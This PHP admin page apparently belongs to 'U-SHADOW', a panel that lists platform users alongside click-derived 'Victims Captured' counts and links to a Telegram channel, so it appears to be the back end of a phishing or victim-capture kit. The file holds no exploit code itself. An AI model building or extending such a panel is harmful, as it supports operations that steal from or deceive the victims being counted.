<?php
require_once __DIR__ . '/../config.php';
if (!isset($_SESSION['user']) || !($_SESSION['user']['is_admin'] ?? false)) {
    header('Location: /admin/login.php');
    exit;
}

$users = json_decode(file_get_contents(USERS_FILE), true);
$analytics = json_decode(file_get_contents(ANALYTICS_FILE), true);

// Calculate victim counts for each user
$user_stats = [];
foreach ($analytics as $click) {
    $uid = $click['user_id'];
    $user_stats[$uid] = ($user_stats[$uid] ?? 0) + 1;
}

$csrf_token = generate_csrf_token();
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>U-shadow | Admin - User Management</title>
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><path d=%22M50 5 L95 50 L50 95 L5 50 Z%22 fill=%22%23333%22 stroke=%22%23eee%22 stroke-width=%225%22/><text x=%2250%22 y=%2265%22 font-size=%2240%22 font-weight=%22bold%22 fill=%22white%22 text-anchor=%22middle%22 font-family=%22Arial%22>U</text></svg>">
    <link rel="stylesheet" href="/style.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body class="dashboard-body">

<div class="sidebar">
    <div class="sidebar-brand">U-SHADOW</div>
    <ul class="sidebar-menu">
        <li><a href="/admin/index.php"><i class="fas fa-chart-line"></i> Dashboard</a></li>
        <li class="active"><a href="/admin/users.php"><i class="fas fa-users"></i> User Management</a></li>
        <li><a href="/admin/categories.php"><i class="fas fa-plus-circle"></i> Manage Hubs</a></li>
        <li><a href="/admin/password.php"><i class="fas fa-key"></i> Security</a></li>
        <li><a href="/dashboard.php" style="color: #6ed3ff;"><i class="fas fa-arrow-left"></i> User Dashboard</a></li>
        <li style="margin-top: 100px;"><a href="/logout.php"><i class="fas fa-sign-out-alt"></i> Sign Out</a></li>
    </ul>
</div>

<main class="main-content">
    <div style="text-align: center; margin-bottom: 20px;">
        <a href="https://t.me/your_telegram" target="_blank" style="color: blue; text-decoration: underline; font-weight: 600; font-size: 18px;">Join Our Telegram</a>
    </div>
    <div class="top-bar">
        <div class="page-title">
            <h1>User Management</h1>
        </div>
        <div class="user-profile">
            <div class="user-info">
                <span class="name"><?php echo s($_SESSION['user']['username']); ?></span>
                <span class="role">Administrator</span>
            </div>
            <div class="avatar">A</div>
        </div>
    </div>

    <section class="section">
        <div class="section-header">
            <h2><i class="fas fa-list"></i> Registered Platform Users</h2>
        </div>
        <div class="section-content">
            <table class="custom-table">
                <thead>
                    <tr>
                        <th>Username</th>
                        <th>Status</th>
                        <th>Victims Captured</th>
                        <th>Account Type</th>
                    </tr>
                </thead>
                <tbody>
                    <?php foreach ($users as $user): ?>
                    <tr>
                        <td style="font-weight: 600;"><?php echo s($user['username']); ?></td>
                        <td><span class="badge badge-success">ACTIVE</span></td>
                        <td><strong class="text-primary"><?php echo $user_stats[$user['username']] ?? 0; ?></strong></td>
                        <td><?php echo ($user['is_admin'] ?? false) ? 'Administrator' : 'Standard User'; ?></td>
                    </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>
    </section>

    <footer class="dashboard-footer">
        &copy; 2010-2025 | <strong>U-SHADOW Professional v3.5</strong> | All Rights Reserved.
    </footer>
</main>

</body>
</html>
